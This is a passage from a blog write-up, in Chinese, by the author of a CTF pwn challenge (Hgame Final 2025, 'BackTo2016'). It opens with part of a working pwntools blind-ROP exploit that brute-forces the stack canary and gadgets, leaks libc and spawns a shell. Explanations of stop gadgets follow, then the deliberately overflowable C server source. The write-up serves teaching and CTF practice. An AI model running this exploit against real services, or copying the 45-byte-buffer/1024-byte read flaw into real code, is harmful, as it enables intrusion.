p64(<span class="number">4</span>) + p64(<span class="number">5</span>) + p64(<span class="number">6</span>)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        payload += p64(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.send(payload)</span><br><span class="line">            v = p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;killed&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">                log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                log.info(<span class="string">&quot;possible: 0x%x&quot;</span> % addr)</span><br><span class="line">                payload = <span class="string">b&quot;a&quot;</span> * buf_size + p64(canary) + p64(addr)</span><br><span class="line">                payload += p64(addr)</span><br><span class="line">                payload += p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(<span class="number">3</span>) + p64(<span class="number">4</span>) + p64(<span class="number">5</span>) + p64(<span class="number">6</span>)</span><br><span class="line">                p.send(payload)</span><br><span class="line">                v = p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;killed&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">                    log.info(<span class="string">&quot;gadget: 0x%x&quot;</span> % addr)</span><br><span class="line">                    <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_plt</span>(<span class="params">buf_size, stop_addr, gadgets_addr</span>):</span><br><span class="line">    pop_rdi = gadgets_addr + <span class="number">9</span>  <span class="comment"># pop rdi; ret;</span></span><br><span class="line">    addr = <span class="number">0x400700</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span> * buf_size + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">        payload += p64(pop_rdi)</span><br><span class="line">        payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        v = p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;\x7fELF&quot;</span> <span class="keyword">in</span> v:</span><br><span class="line">            log.info(<span class="string">&quot;puts@plt address: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_memory</span>(<span class="params">buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr</span>):</span><br><span class="line">    pop_rdi = gadgets_addr + <span class="number">9</span>  <span class="comment"># pop rdi; ret</span></span><br><span class="line">    result = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> start_addr &lt; end_addr:</span><br><span class="line">        sleep(<span class="number">0.01</span>)</span><br><span class="line">        payload = <span class="string">b&quot;a&quot;</span> * buf_size + p64(canary) + p64(<span class="number">0x12345678</span>)</span><br><span class="line">        payload += p64(pop_rdi)</span><br><span class="line">        payload += p64(start_addr)</span><br><span class="line">        payload += p64(puts_plt)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        data = p.recvline()</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&quot;\n&quot;</span>:</span><br><span class="line">            data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> data[-<span class="number">1</span>] == <span class="number">0x0A</span>:</span><br><span class="line">            data = data[:-<span class="number">1</span>]</span><br><span class="line">        log.info(<span class="string">&quot;leaking: 0x%x --&gt; %s&quot;</span> % (start_addr, data.<span class="built_in">hex</span>()))</span><br><span class="line">        result += data</span><br><span class="line">        start_addr += <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">buf_size, canary, stop_addr, gadgets_addr, puts_plt, puts_got</span>):</span><br><span class="line">    pop_rdi = gadgets_addr + <span class="number">9</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * buf_size + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(puts_got)</span><br><span class="line">    payload += p64(puts_plt)</span><br><span class="line">    payload += p64(stop_addr)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    a = p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line">    data = u64(data[:-<span class="number">1</span>] + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;puts address: 0x%x&quot;</span> % data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># buf_size = get_buffer_size()</span></span><br><span class="line">buf_size = <span class="number">56</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;password:&quot;</span>)</span><br><span class="line">canary = get_canary(buf_size)</span><br><span class="line"></span><br><span class="line"><span class="comment">#stop_addr = get_stop_addr(buf_size,canary)</span></span><br><span class="line">stop_addr = <span class="number">0x4007c0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadgets_addr = get_gadgets_addr(buf_size, canary, stop_addr)</span></span><br><span class="line">gadgets_addr = <span class="number">0x400b2a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get_puts_plt(buf_size,stop_addr,gadgets_addr)</span></span><br><span class="line">puts_plt = <span class="number">0x400715</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, 0x400000, 0x605000)</span></span><br><span class="line"><span class="string">with open(&quot;code.bin&quot;, &quot;wb&quot;) as f:</span></span><br><span class="line"><span class="string">    f.write(code_bin)</span></span><br><span class="line"><span class="string">    f.close()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">puts_got = <span class="number">0x602018</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_puts_addr(buf_size, canary, stop_addr, gadgets_addr, puts_plt, puts_got)</span><br><span class="line"></span><br><span class="line">puts_offset = libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">success(<span class="string">&#x27;libc_base = &#x27;</span>+ <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base+libc.sym.system</span><br><span class="line">binsh_addr = libc_base + <span class="number">0x180543</span></span><br><span class="line"></span><br><span class="line">payload = payload = <span class="string">b&quot;a&quot;</span> * buf_size + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(gadgets_addr + <span class="number">9</span>)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(stop_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>其实相信真正做了一遍题目的同学会发现，好像一切并不如分析的那样简单。</p>
+<p>让我们来简单探讨几个问题吧。</p>
+<h5 id="什么是stop-gadget？"><a href="#什么是stop-gadget？" class="headerlink" title="什么是stop_gadget？"></a>什么是stop_gadget？</h5><p>在论文中，我们把能让程序挂起的，类似死循环或者阻塞这样的代码片段称为 stop_gadget 。</p>
+<p>很显然，在<code>出题人失踪了</code>这道题中,程序是没有死循环的，那么在<a class="link"   target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html" >pwn HCTF2016 brop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>里面找到的<code>stop address: 0x4005e5</code>又是什么呢。</p>
+<p>尽管我没有编译过原题，比对二进制文件，但在后文中，我们看到<code>puts@plt address: 0x4005e7</code>，所以这个 stop 应当是一个 plt 表上的函数。</p>
+<p>也就是说，有某个函数可以使程序挂起。比如说 read ，就可以起到阻塞的作用。那既然 read 可以，其他函数可不可以。read@plt 可以，那么下一行的 read@got 可不可以？plt 表上的函数可以，程序里的函数可不可以？</p>
+<p>显然，stop_gadget 是不止一个的。</p>
+<p>那么，我们再来讨论什么是 stop_gadget 。讨论这个问题的意义主要在于，read 并不是一个性质足够完美的来帮助我们爆破或者利用的函数，这里的阻塞很有可能会因为一些收发输入而该改变计划，尤其如果在一个更大更复杂的程序中。stop_gadget 最主要是为了能够<strong>找到一个不会使程序崩溃的返回地址</strong>，他最好像不会影响我们的任何操作。</p>
+<p>在测题的过程中，我认为 exit 就是一个很好的 stop_gadget ，合法且可以快速的结束进程。</p>
+<h5 id="什么时候回到-main-函数？"><a href="#什么时候回到-main-函数？" class="headerlink" title="什么时候回到 main 函数？"></a>什么时候回到 main 函数？</h5><p>除了直接在 ret 的位置上填上 main 的入口地址或者 main 函数上的合法地址，还有一些程序的初始化函数。</p>
+<p>虽然 main 作为程序的入口函数，在程序中是唯一的。一般情况下，我们也不会在子函数中调用 main 。但是 main 函数的执行前，程序会执行一些初始化函数，比如 __libc_csu_init ，这些函数在 main 函数执行前执行，在 main 函数执行后结束。</p>
+<p>注意，main 并不是一个足够好的 stop ，虽然它不会更新 canary ，它会拦截我们一次子进程的结束，对于这次子进程结束有回显的情况下来说，这不利于我们与程序交互。</p>
+<h5 id="为什么要检查-pop-rdi"><a href="#为什么要检查-pop-rdi" class="headerlink" title="为什么要检查 pop rdi ?"></a>为什么要检查 pop rdi ?</h5><p>首先应有一个共识，一般情况下，程序自然产生的 pop rdi 代码片段只存在于 __libc_csu_init 的一个错位片段里。</p>
+<h6 id="第一个原因："><a href="#第一个原因：" class="headerlink" title="第一个原因："></a>第一个原因：</h6><p>stop_gadget 不止一个，这会导致不加检查时我们看似找到一个不会使程序崩溃的 6 个连续 pop ，然而实际情况是我们刚执行到第一个 retn ，程序就 stop 了。</p>
+<p>这里的检查方式是再输入一遍相同的 payload 但去除末尾的 stop ，此时应当是程序崩溃。</p>
+<p>当然除了上述的方式可以预防找到错误的 gadget ，我们也可以选择检查 possible gadget+1 是否是 5 个连续 pop 等类似方式。 </p>
+<h6 id="第二个原因："><a href="#第二个原因：" class="headerlink" title="第二个原因："></a>第二个原因：</h6><p>__libc_csu_init 是一段相互调用的代码，<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Z1naX5/PicGo/master/images/20250319092322.png"
+                      alt="20250319092322"
+                ></p>
+<p>这里有几个跳转：</p>
+<ul>
+<li>0x400b06</li>
+<li>0x400b24</li>
+<li>0x400b34</li>
+</ul>
+<p>前两个地址通过比较寄存器都有可能跳转到 0x400b26 ，即我们需要确定的 gadget 的上一句。</p>
+<p>看上去并没有什么问题，因为我们仅填充了 pop 的六次，并希望正确的地址可以 retn 第七个位置，而如果是从前两个地址跳转过来（ 0x400b24 处是不满足条件顺序执行），0x400b26 先抬了一次栈， 0x400b34 retn 的将是一个栈上我们没有控制的地址。</p>
+<p>没有控制，是很危险的。有时栈上可能是一些脏数据，但也可能是某个合法的返回地址。由于我们是无法控制这两个跳转的，他们比较的寄存器是在之前正常运行时就完成的（当然我们可以控制自己填写的 rbp 不为 0 来避免从 0x400b03 跳转走），所以在栈溢出足够的情况下，应该把第八个地址控制一下。</p>
+<p>在最后上题的版本之前，前两个地址并不会跳到 0x400b26 ，然而在我删掉后门后就寄存器发生了一些变化，这就是为什么我认为这里的寄存器不可控制。并且第八个位置为 start ，也就是启动 main 函数的地方，恰巧是一个不太好的 stop 。</p>
+<h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><p>请在 Glibc&lt;2.34 的版本下编译，以确保有 __libc_csu_init 可用</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">45</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">&quot;aaaaaaaaaaaaaa&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run_server</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Server (PID: %d) is running...\n&quot;</span>, getpid());</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!check())&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[351mBingo!But it doesn&#x27;t matter.\033[0m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[35mIncorrect password, login failed.\033[0m&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nWELCOME BACK TO \033[36m2016\033[0m!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This year, \033[36mUbuntu 14.04\033[0m is still one of the popular versions.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And...we still have many unpatched vulnerable code snippets.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We found an unstable TCP server.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s try \033[36mHacking Blind\033[0m!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            run_server();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> status;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Main process: Server (PID: %d) exited with status %d. Restarting...\n&quot;</span>, pid, WEXITSTATUS(status));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Main process: Server (PID: %d) killed by signal %d. Restarting...\n&quot;</span>, pid, WTERMSIG(status));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="一些杂谈"><a href="#一些杂谈" class="headerlink" title="一些杂谈"></a>一些杂谈</h3><p>我们的题被运维师傅评价为出题人放飞自我了，，好吧可能是有点。</p>
+<p>起因是我们都想出个内核，于是 1s 提出想要让选手打完一个用户态的 pwn 题拿到 shell 之后，再内核提权。以及 1s 想的是因为打完第一题用户已经有了一个shell,所以也不给附件，而是自己去里面拿。</p>
+<p>于是我就想到一个不适合出在别的地方但还算适合 Hgame Final 的点，BROP。</p>
+<p>最后就是我们把主题定在了真实情景，主要真实在一个是没有附件调试，另一个是漏洞复现（指BackTo2016（2））.</p>
+<p>至于 2016 这个年份其实也是凑巧发现，他是一个 2016 年的洞，我的知识点出现在 2016 年的ctf比赛上。</p>
+<p>偶对了，今年 Hgamefinal 有 Vidar 知识大问答，Hgame 的全称是 HCTFgame 。虽然 HCTF 和 HCTFgame 已经是两码事了，但在很多年后复现曾经老学长整过的活，还是很有趣的。</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hgame-final-2025-pwn-BackTo2016</li>
+        <li><strong>Author:</strong> M1aoo0bin</li>
+        <li><strong>Created at
+                :</strong> 2025-03-18 19:42:18</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-03-19 10:06:52
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/03/18/Hgamefinal2025/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Pwn/">#Pwn</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0/">#出题手记</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/02/16/%E7%A2%8E%E9%9B%A8%E6%96%AD%E7%8F%A0%E5%9E%82%E7%9C%BC%E8%90%BD/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">碎雨断珠垂眼落</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hgame-final-2025-pwn-BackTo2016</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#BackTo2016"><span class="nav-number">1.</span> <span class="nav-text">BackTo2016</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#wp"><span class="nav-number">1.1.</span> <span class="nav-text">wp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exp"><span class="nav-number">1.1.2.</span> <span class="nav-text">Exp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#More"><span class="nav-number">1.1.3.</span> <span class="nav-text">More</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFstop-gadget%EF%BC%9F"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">什么是stop_gadget？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E5%9B%9E%E5%88%B0-main-%E5%87%BD%E6%95%B0%EF%BC%9F"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">什么时候回到 main 函数？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%A3%80%E6%9F%A5-pop-rdi"><span class="nav-number">1.1.3.3.</span> <span class="nav-text">为什么要检查 pop rdi ?</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="nav-number">1.1.4.</span> <span class="nav-text">题目源码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%9D%82%E8%B0%88"><span class="nav-number">1.2.</span> <span class="nav-text">一些杂谈</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">借我酒一杯，慢叙愁百千</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">M1aoo0bin</a>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.4</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
